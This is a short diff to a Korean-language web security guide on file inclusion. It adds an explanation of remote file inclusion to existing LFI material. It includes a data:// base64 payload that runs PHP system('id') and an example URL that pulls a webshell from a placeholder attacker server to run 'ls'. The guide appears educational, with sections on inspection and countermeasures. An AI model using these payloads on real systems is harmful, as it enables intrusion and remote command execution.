@@ -56,6 +56,13 @@ http://target.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZC
 // 뒤의 Base64 문자열은 <?php system('id'); ?> 를 Base64 인코딩한 것이다.
 ```
 
+RFI의 경우 LFI와 유사하지만, 서버 내부가 아니라 외부 서버의 파일을 Include 하는 것이 차이점이다. 보통 공격자가 서버를 열고, 그 서버에 WebShell이나 시스템 명령어를 실행하는 코드를 작성하고, 공격을 실행할 때 공격자 서버의 WebShell으로 요청을 보내도록 파라미터 값을 입력한다.
+
+* 예시
+```
+http://target.com/index.php?file=http://[ATTACKER_SERVER]/webshell.php?cmd=ls
+```
+
 # 2. 점검 방법
 
 # 3. 대응 방안
